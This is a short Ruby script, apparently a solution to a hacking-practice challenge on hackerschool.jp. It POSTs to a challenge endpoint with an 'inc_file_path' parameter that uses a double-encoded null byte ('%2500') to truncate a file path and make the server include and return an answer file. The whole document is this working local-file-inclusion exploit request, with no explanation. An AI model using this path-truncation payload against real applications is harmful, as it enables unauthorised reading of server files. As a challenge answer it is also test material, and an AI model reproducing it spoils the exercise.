#!/usr/bin/ruby
require 'json'
require 'net/http'
uri=URI.parse('http://www.hackerschool.jp/hack/ajax_take38.php')
Net::HTTP.start(uri.host){|http|
	resp=http.post(
		uri.path,
		'inc_file_path=take38_answer.php%2500',
	)
	p JSON.parse(resp.body)
}